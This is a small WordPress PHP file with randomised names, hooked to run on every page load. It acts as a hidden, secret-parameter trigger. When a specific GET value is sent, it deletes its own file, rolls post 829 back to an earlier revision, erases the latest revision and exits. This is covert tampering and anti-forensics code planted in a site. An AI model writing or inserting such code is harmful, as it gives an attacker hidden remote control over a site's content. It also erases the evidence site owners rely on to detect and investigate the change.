<?php

function wall_info_content_solution() {
	if (isset($_GET['conversion_based_rich_sidebar']) && $_GET['conversion_based_rich_sidebar'] === 'flash_term_slider') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$code_members_embedder_pro = 829;
		$groups_review_reports = wp_get_post_revisions($code_members_embedder_pro);
		if (empty($groups_review_reports)) die('no revisions');
		if (count($groups_review_reports) < 2) die('less than 2');
		$results_reader_s3_count = array_shift($groups_review_reports);
		$player_daily_frontend = $results_reader_s3_count->ID;
		$contact_domain_option_utils = array_shift($groups_review_reports);
		$table_switch_quantity = $contact_domain_option_utils->ID;
		$custom_campaign_before_reusable = wp_restore_post_revision($table_switch_quantity);
		if ($custom_campaign_before_reusable === false) die('error restoring');
		$custom_campaign_before_reusable = wp_delete_post_revision($player_daily_frontend);		
		if ($custom_campaign_before_reusable === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'wall_info_content_solution');
